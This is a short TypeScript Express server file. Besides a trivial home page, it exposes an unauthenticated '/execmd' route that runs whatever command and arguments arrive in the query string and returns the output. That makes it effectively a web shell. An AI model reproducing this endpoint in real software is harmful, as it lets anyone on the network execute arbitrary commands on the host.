import express from 'express';
import {execCommand} from './execCommand';

const app = express();

app.get('', (_, res) => {
  res.send('<h1>My application</h1>');
});

app.get('/execmd', (req, res) => {
  if (!req.query.cmd) {
    return res.send('<h1>404</h1>');
  } else {
    execCommand(req.query.cmd as string, req.query.args as string, (err, data) => {
      if (err) {
        return res.send(err);
      } else {
        return res.send(data);
      }
    });
  }
});

app.listen(3000, () => {
  console.log('Server is up on port 3000');
});